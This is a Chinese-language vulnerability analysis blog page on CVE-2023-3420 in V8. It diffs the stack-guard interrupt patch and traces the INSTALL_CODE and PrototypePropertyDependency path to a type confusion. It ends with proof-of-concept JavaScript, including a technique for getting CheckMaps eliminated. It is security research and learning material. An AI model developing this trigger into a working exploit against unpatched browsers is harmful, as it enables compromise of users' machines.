<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>cve-2023-3420</title>
  <link rel="stylesheet" href="https://stackedit.cn/style.css" />
</head>

<body class="stackedit">
	<a href="../index.html" style="position: fixed; top: 0; left: 2pt; text-align: center;text-decoration-line: none;color: black;font-size: 15px;">
		<img src="../img/home.png" width="15" height="15" alt="home">
		<span>HOME PAGE</span>
	</a>
  <div class="stackedit__html"><h2 id="patch"><span class="prefix"></span><span class="content">patch</span><span class="suffix"></span></h2>
<p>9.4<br>
<a href="https://chromium-review.googlesource.com/c/v8/v8/+/4614699">[compiler] only handle side-effect free interrupts in loop stack checks (4614699) · Gerrit Code Review (googlesource.com)</a></p>
<h2 id="分析"><span class="prefix"></span><span class="content">分析</span><span class="suffix"></span></h2>
<p>此patch涉及到多个文件的修改</p>
<ul>
<li><a href="https://chromium-review.googlesource.com/c/v8/v8/+/4614699/7/include/v8-internal.h">…/v8-internal.h</a>：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-09-04/ikIchB7JUB9Y1Oty.png" alt="输入图片说明"><br>
此处修改主要是增加了StackGuard的大小，因为在这之后针对StackGuard的操作增加了一些新的内容。</li>
<li><a href="https://chromium-review.googlesource.com/c/v8/v8/+/4614699/7/src/codegen/external-reference.h">…/external-reference.h</a>：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-09-04/Ud1DA4lnE6XLe0OG.png" alt="输入图片说明"><br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-09-05/dTYD10MMJd61KRsw.png" alt="输入图片说明"><br>
此处修改并且针对迭代节点进行专门的处理，对于迭代节点使用WordEqual节点来替代StackCheckKindOfJSStackCheck节点作为检查节点，而在获取外部中断引用对象时，原本此处获取的是一个外部的<code>jslimit</code>中断引用地址，而修改后将获取一个<code>no_heap_write</code>中断的外部引用地址。</li>
</ul>
<p>除此以外还新添加了一个限制条件，那就是当当前stack_check节点的kind为循环迭代体<code>kJSIterationBody</code>时，在之后执行运行时函数就去执行不会进行堆写入的运行时函数，总体来讲此次path主要是为了防止在栈保护机制执行runtime函数时中断处理对某个堆进行写入从而导致的类型混淆。</p>
<ul>
<li><a href="https://chromium-review.googlesource.com/c/v8/v8/+/4614699/7/src/runtime/runtime-internal.cc">…/runtime-internal.cc </a>：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-09-05/oVtmIdXZ4Km5hTPU.png" alt="输入图片说明"><br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-09-05/5JXwRka4UYSsnf9l.png" alt="输入图片说明"><br>
此处修改中就添加了上一步提到的那个不会进行堆写入操作的运行时函数<code>Runtime_HandleNoHeapWritesInterrupts</code>，通过观察堆中断处理函数<code>HandleInterrupts</code>可以发现这里主要是依托一个<code>kNoHeapWrite</code>参数来实现的，而原本<code>Runtime_StackGuard</code>函数在调用堆中断处理函数<code>HandleInterrupts</code>时也需要传入一个<code>kAnyEffect</code>参数才可以</li>
<li><a href="https://chromium-review.googlesource.com/c/v8/v8/+/4614699/7/src/execution/stack-guard.h#54">…/stack-guard.h</a>：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-09-05/VSYFn1gAORC3LQUT.png" alt="输入图片说明"><br>
此处修改首先添加了上面提到的几个参数，实际上除了<code>kAnyEffect</code>与<code>kNoHeapWrite</code>外还有一个<code>kNoGC</code>。<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-09-05/iaSpIk4DRE2UnrQb.png" alt="输入图片说明"><br>
之后为不同的中断还新添加了一个中断级别参数，这的中断级别对应的就是前面新添加的内容，这些中断级别主要用来计算中断标志掩码。<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-09-05/HwkUWmpEX8UnuN71.png" alt="输入图片说明"><br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-09-05/WvvvpbXBovJ0VdyC.png" alt="输入图片说明"><br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-09-05/MkM7mREHiYb9gv9a.png" alt="输入图片说明"><br>
最后通过此掩码来计算具体的中断标志，以此来进入正确的中断处理事件，防止在执行中断操作时因为某些副作用导致出现问题。</li>
</ul>
<h2 id="总结"><span class="prefix"></span><span class="content">总结</span><span class="suffix"></span></h2>
<p>此漏洞可能是一个由于在执行stack_guard中断时有中断操作的副作用导致某个堆被错误的修改或者写入了某些内容从而最终导致类型混淆。<br>
初步判断POC应该满足以下条件：</p>
<ul>
<li>首先要通过循环来触发生成<code>kJSIterationBody</code>类型的<code>StackCheck</code>节点，此节点会导致<code>Runtime_StackGuard</code>函数的执行</li>
<li>在循环中要执行某个会触发中断处理函数<code>StackGuard::HandleInterrupts</code>中对应的具体的中断事件</li>
</ul>
<h2 id="漏洞分析"><span class="prefix"></span><span class="content">漏洞分析</span><span class="suffix"></span></h2>
<p>9.26<br>
漏洞poc以及相关分析文章已经公开，对于漏洞的前半部分触发流程与我之前的分析基本一致，当通过循环迭代触发<code>kJSIterationBody</code>类型的<code>StackCheck</code>节点时会导致<code>Runtime_StackGraud</code>函数被触发，只是之前对于<code>Runtime_StackGraud</code>函数的分析存在一些错误的理解，<code>Runtime_StackGraud</code>函数中的中断事件并不是由循环本身所触发或者创建的，在v8的线程中会维护一个中断事件列表，当执行到<code>Runtime_StackGraud</code>函数时会去检查此列表，当有中断事件(例如GC、编译等事件)需要执行时，就暂时中断之前的操作进入相关的中断事件进行执行，也就是说这些中断事件基本都是由其他线程创建，事实也确实如此GC、编译等事件并不是由同一个线程负责处理。</p>
<p>漏洞的前半部分分析基本正确，当<code>Runtime_StackGraud</code>函数执行时会检查当前是否有<code>INSTALL_CODE</code>事件需要执行，此事件通常是由于有其他线程在执行后台编译事件，当后台编译事件完成时就会将相关的<code>INSTALL_CODE</code>事件存入中断列表，随后当<code>Runtime_StackGraud</code>函数被调用时就去执行此<code>INSTALL_CODE</code>事件将编译好的code安装到对应的函数对象中。之前由于对中断事件的错误认知导致我以为<code>INSTALL_CODE</code>是需要在循环中反复调用函数使被调用的函数成热点函数触发编译事件才会触发，但是最终通过这种方式尝试去触发<code>INSTALL_CODE</code>事件时会发现此事件并不能稳定的被触发，而且似乎需要嵌套循环才会准确的在执行循环迭代时触发<code>Runtime_StackGuard</code>函数(之前我一直使用单层循环)，以下代码前者可以触发，而后者却不可以：</p>
<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token number">0x500</span><span class="token punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span>b<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>b<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		k<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token number">0x500</span><span class="token punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>b<span class="token operator">*</span>b<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	k<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>当INSTALL_CODE事件触发后会调用到<code>FinalizeTurbofanCompilationJob</code>函数来结束编译事件，在此函数的执行过程中会通过以下调用路径调用到<code>CompilationDependencies::Commit</code>函数来提交安装依赖项：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-10/O3tomcLaQWW5KTER.png" alt="输入图片说明"><br>
<code>CompilationDependencies::Commit</code>函数会调用<code>PrepareInstall</code>来为依赖项的安装做准备，<code>PrepareInstall</code>函数中会遍历所有依赖内容并逐一处理，问题就出在这些依赖项的准备安装处理中：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-10/DXm8PI7nNLrowZ12.png" alt="输入图片说明"><br>
首先要明确<code>Runtime_StackGuard</code>函数是循环迭代正在执行时被执行的，然后当遇到<code>PrototypePropertyDependency</code>依赖项的准备处理时就会去调用<code>EnsureHasInitialMap</code>函数，而<code>EnsureHasInitialMap</code>函数会调用<code>SetInitialMap</code>函数将相关函数对象的Prototype字段的map修改为字典类型：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-10/m6YIbziE4qDmtRPL.png" alt="输入图片说明"><br>
所以现在就出现了问题，如果将循环包裹在foo函数中，再提前将foo函数编译好，然后再编写一个foo2函数，将其放在后台进行编译，如果在执行编译后foo函数中的循环时如果foo2函数刚好编译好的话，就会触发循环中<code>Runtime_StackGuard</code>函数的触发，但是如果只是如此的话还是无法达到触发漏洞的效果，现在还需要在提交安装依赖时保证会有一个<code>PrototypePropertyDependency</code>依赖被处理，只有这样才会使prototype的map被修改，通过对<code>PrototypePropertyDependency</code>类的引用查找会找到在<code>CompilationDependencies::DependOnPrototypeProperty</code>函数中会创建<code>PrototypePropertyDependency</code>对象并插入到依赖列表中：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-10/mqlSWuLTBvPJ1Kok.png" alt="输入图片说明"><br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-10/99aDsoazuQ381ZPQ.png" alt="输入图片说明"><br>
再查找<code>CompilationDependencies::DependOnPrototypeProperty</code>函数的调用者会发现会有以下函数调用，暂且先排除Maglev中的内容，还有LoadNamed操作与OrdinaryHasInstance节点操作会触发<code>PrototypePropertyDependency</code>依赖的创建，也就是说只需要在foo2函数优化编译的过程中触发这两个节点的创建就可以创建<code>PrototypePropertyDependency</code>依赖：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-10/sXBNSdhjIXjOOHvu.png" alt="输入图片说明"><br>
LoadNamed操作主要用于加载属性，并且属性的receiver必须得是一个HeapConstant(因为使用了HeapObjectMatcher对象)，但要注意的是被创建的<code>PrototypePropertyDependency</code>依赖的prototype必须得是要被混淆的类的prototype，也就是说当前属性的receiver必须得是要被混淆的类，我试过很多方法都没有达到想要的结果，POC原作者在此处也没有使用LoadName而是用了OrdinaryHasInstance：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-10/MI9fOhlE9pvGsqW4.png" alt="输入图片说明"><br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-11/0GcJckbWUoCoVfUU.png" alt="输入图片说明"><br>
OrdinaryHasInstance可以在js代码中使用instanceof来触发，他会使用同样的<code>HasResolvedValue()</code>函数来检查当前node的constructor是否为HeapConstant：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-11/LprFMAmpnJA2oZCg.png" alt="输入图片说明"><br>
最后只要保证constructor是函数就可以触发<code>PrototypePropertyDependency</code>依赖的创建：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-11/z7Dw4I7mx4TXFTiR.png" alt="输入图片说明"><br>
此时已经可以在循环执行时修改prototype的map，尝试在map被修改后向prototype中的属性存储内容，通过以上的步骤总结可以大致得到以下代码：</p>
<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
B<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
B<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">foo2</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">return</span> x <span class="token keyword">instanceof</span> <span class="token class-name">B</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> proto<span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">let</span> k <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	k<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">0xA</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// trigger Runtime_StackGraud function</span>
	<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span>b<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>b<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			k<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	proto<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">0x1111</span><span class="token punctuation">;</span>
	proto<span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token number">0x1212</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> k<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// compile foo</span>
<span class="token operator">%</span><span class="token function">PrepareFunctionForOptimization</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">foo</span><span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">,</span> B<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">OptimizeFunctionOnNextCall</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">foo</span><span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">,</span> B<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token function">PrepareFunctionForOptimization</span><span class="token punctuation">(</span>foo2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// backgound compile foo2</span>
<span class="token operator">%</span><span class="token function">OptimizeFunctionOnNextCall</span><span class="token punctuation">(</span>foo2<span class="token punctuation">,</span> <span class="token string">"concurrent"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">foo2</span><span class="token punctuation">(</span><span class="token punctuation">{</span>b<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">foo</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span> B<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>B<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>但只是如此会发现还是没有触发崩溃，通过观察turbolizer图会发现当在向属性写入值的时候会插入一个CheckMaps节点，此节点生成的优化代码会去检查prototype的map，从而导致漏洞在此处被修正，所以还需要想办法绕过这个CheckMaps检查：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-11/QP39bcGw8irDcwoA.png" alt="输入图片说明"><br>
对象字段的存储操作基本都会触发CheckMaps的创建，通过查找<code>ReduceCheckMaps</code>函数可以找到一些此节点被优化删除的逻辑，ReduceCheckMaps函数有两个，<code>LoadElimination::ReduceCheckMaps</code>只在LoadElimination阶段会被调用，<code>TypedOptimization::ReduceCheckMaps</code>则会分别在TypedLowering与LoadElimination阶段被调用：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-18/Aev4mOzPwhxWhwGO.png" alt="输入图片说明"><br>
通过调试LoadElimination阶段的代码会发现在调用ReduceCheckMaps函数前会先调用ReduceCheckpoint函数，将Checkpoint节点替换为它的Effect节点：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-18/ZabuAp8q1xMlMsSw.png" alt="输入图片说明"><br>
此时CheckMaps节点的Effect节点已经变成了SpeculativeNumberLessThan节点，随后去执行<code>LoadElimination::ReduceCheckMaps</code>函数，此函数会先通过CheckMaps节点的op来获取maps，然后检查是否已经有UpdateState函数已经处理过SpeculativeNumberLessThan节点，如果没有的话那就会因为无法根据SpeculativeNumberLessThan节点获取State对象而直接退出函数，此处会直接退出，如果state对象不为空时则会从State对象中获取object的map，并尝试将object_maps与前面得到的maps进行比较，如果相同说明CheckMaps节点时可以用其Effect节点替换的：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-12/YjVXG0ai7cLH0MpE.png" alt="输入图片说明"><br>
之后会去执行<code>TypedOptimization::ReduceCheckMaps</code>函数，此函数替换CheckMaps节点的前提是CheckMaps所检查的Object必须具有一个稳定的map，并且还要有一个HeapConstant表示：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-12/Pdl5d1vasghpjxnz.png" alt="输入图片说明"><br>
所以现在需要一种操作使<code>proto</code>触发在执行循环之前生成一个HeapConstant节点，通过<code>obj.x=ptoto</code>或<code>obj['x']=proto</code>可以使proto触发创建HeapConstant节点：</p>
<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> proto<span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token comment">// Allocate[Any, Young]</span>
	<span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
	<span class="token keyword">let</span> k <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	k<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">0xA</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// StoreField[0]</span>
	obj<span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span> <span class="token operator">=</span> proto<span class="token punctuation">;</span>
	<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span>b<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>b<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			k<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	proto<span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token number">0x1212</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> k<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p><img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-18/ALQ4Y4CktLFMDCbD.png" alt="输入图片说明"><br>
而<code>B.prototy</code>的map本身也是一个stable_map<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-18/PelvFV33ulYsWGFf.png" alt="输入图片说明"><br>
根据以上分析可以得到一个与原漏洞提交者公开的poc类似的代码用例：</p>
<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
B<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
B<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">foo2</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">return</span> x <span class="token keyword">instanceof</span> <span class="token class-name">B</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> proto<span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> k <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  k<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">0xA</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  obj<span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span> <span class="token operator">=</span> proto<span class="token punctuation">;</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span>b<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>b<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      k<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  proto<span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token number">0x1212</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> k<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// compile foo</span>
<span class="token operator">%</span><span class="token function">PrepareFunctionForOptimization</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">foo</span><span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">,</span> B<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">OptimizeFunctionOnNextCall</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">foo</span><span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">,</span> B<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token function">PrepareFunctionForOptimization</span><span class="token punctuation">(</span>foo2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// backgound compile foo2</span>
<span class="token operator">%</span><span class="token function">OptimizeFunctionOnNextCall</span><span class="token punctuation">(</span>foo2<span class="token punctuation">,</span> <span class="token string">"concurrent"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">foo2</span><span class="token punctuation">(</span><span class="token punctuation">{</span>b<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">foo</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span> B<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>B<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<h2 id="总结与思考"><span class="prefix"></span><span class="content">总结与思考</span><span class="suffix"></span></h2>
<ol>
<li>代码审计能力较弱，阅读代码时对代码可能会存在错误的理解，由于无法正确的理解代码逻辑导致最终无法根据patch分析写出poc。</li>
<li>无法完全正确的根据v8 c++源码编写出对应可以触发c++代码执行的js源码用例。</li>
</ol>
<p>我认为漏洞提交者在通过代码审计挖掘此漏洞时着重关注了在创建与使用某些对象/内容之间可能会对此对象/内容做出修改的情况。</p>
</div>
</body>

</html>
